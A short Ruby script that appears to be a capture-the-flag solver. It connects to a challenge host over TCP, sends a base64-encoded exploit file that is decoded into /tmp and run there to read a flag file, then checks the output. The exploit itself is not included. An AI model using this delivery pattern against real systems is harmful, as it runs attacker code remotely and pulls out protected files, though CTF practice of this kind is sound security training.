# encoding: ASCII-8bit

require 'base64'
require 'tempfile'
require 'socket'
require_relative './libronsolve'

command = [
  "echo \"#{ Base64.strict_encode64(File.read(File.join(__dir__, 'exploit_script.rb'))) }\" | base64 -d > /tmp/exploit.rb",
  'ruby /tmp/exploit.rb /home/ctf/flag.txt',
].join(';')

host, port = get_host_port
s = TCPSocket.new(host, port)
puts "Connected: #{ s }"

sleep(0.5)

s.readpartial(65_000)

s.puts(command)

sleep(5)
out = s.readpartial(65_000)

check_flag(out, terminate: true, partial: true)
